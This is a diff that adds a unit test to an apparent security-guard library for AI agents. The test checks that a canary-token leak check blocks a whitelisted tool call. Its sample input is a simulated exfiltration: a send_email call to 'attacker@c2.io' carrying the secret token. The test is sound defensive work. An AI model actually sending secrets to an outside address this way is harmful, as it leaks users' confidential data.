@@ -103,3 +103,26 @@ def test_policy_deny_precedence_over_whitelist():
     assert res["allowed"] is False
     assert "explicitly denied" in res["reason"]
 
+
+def test_policy_canary_leakage_blocks_even_if_whitelisted():
+    # Whitelisted tools must NOT bypass Canary token leakage checks
+    policy = SecurityPolicyConfig(
+        whitelisted_tools=["send_email", "fetch_url"],
+        enable_canary_guard=True,
+    )
+    agent = LightGuardAgent(policy=policy)
+    token = agent.canary.generate_canary(label="test_secret")
+
+    # Clean arguments on whitelisted tool are allowed
+    res_clean = agent.verify_action("send_email", {"to": "admin@corp.com", "body": "hello"}, is_untrusted=False)
+    assert res_clean["allowed"] is True
+
+    # Leaking active Canary token inside arguments must be blocked even though tool is whitelisted
+    res_leaked = agent.verify_action(
+        "send_email",
+        {"to": "attacker@c2.io", "body": f"The secret canary is {token}"},
+        is_untrusted=False,
+    )
+    assert res_leaked["allowed"] is False
+    assert "Canary Guard Blocked" in res_leaked["reason"]
+
